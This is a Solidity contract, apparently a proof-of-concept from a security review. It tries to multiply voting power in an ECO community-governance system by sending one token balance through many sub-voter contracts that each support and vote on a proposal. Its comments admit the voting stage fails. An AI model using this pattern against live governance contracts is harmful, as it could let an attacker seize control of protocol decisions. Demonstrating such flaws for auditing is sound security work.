// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Subvoter.sol";

contract InfiniteVote {
    Subvoter[] public subvoters;

    uint256 public immutable NUM_SUBVOTERS;

    uint256 public immutable COST_REGISTER;

    address public immutable PROPOSAL;

    CommunityGovernance public immutable communityGovernance;

    ECO public immutable ecoaddress;

    constructor(
        uint256 _num_subvoters,
        CommunityGovernance _communityGovernance,
        ECO _ecoaddress,
        address _proposal
    ) {
        NUM_SUBVOTERS = _num_subvoters;
        communityGovernance = _communityGovernance;
        COST_REGISTER = _communityGovernance.proposalFee();
        ecoaddress = _ecoaddress;
        PROPOSAL = _proposal;

        // used to show that voting power was actually obtainable
        ecoaddress.enableVoting();

        for (uint256 i = 0; i < (NUM_SUBVOTERS * 11) / 3; i++) {
            subvoters.push(new Subvoter(ecoaddress, communityGovernance));
        }
    }

    function infiniteVote() external {
        communityGovernance.updateStage();
        ecoaddress.approve(address(communityGovernance), COST_REGISTER);
        communityGovernance.propose(Proposal(PROPOSAL));
        for (uint256 i = 0; i < NUM_SUBVOTERS; i++) {
            if (communityGovernance.stage() == CommunityGovernance.Stage.Proposal) {
                ecoaddress.transfer(
                    address(subvoters[i]),
                    ecoaddress.balanceOf(address(this))
                );
                subvoters[i].support(PROPOSAL);
            } else {
                break;
            }
        }

        // never gets to this point due to a number of previous failures including failure to add voting power
        for (uint256 i = 0; i < (NUM_SUBVOTERS * 11) / 3; i++) {
            if (communityGovernance.stage() == CommunityGovernance.Stage.Voting) {
                ecoaddress.transfer(
                    address(subvoters[i]),
                    ecoaddress.balanceOf(address(this))
                );
                subvoters[i].vote();
            } else {
                break;
            }
        }
    }
}
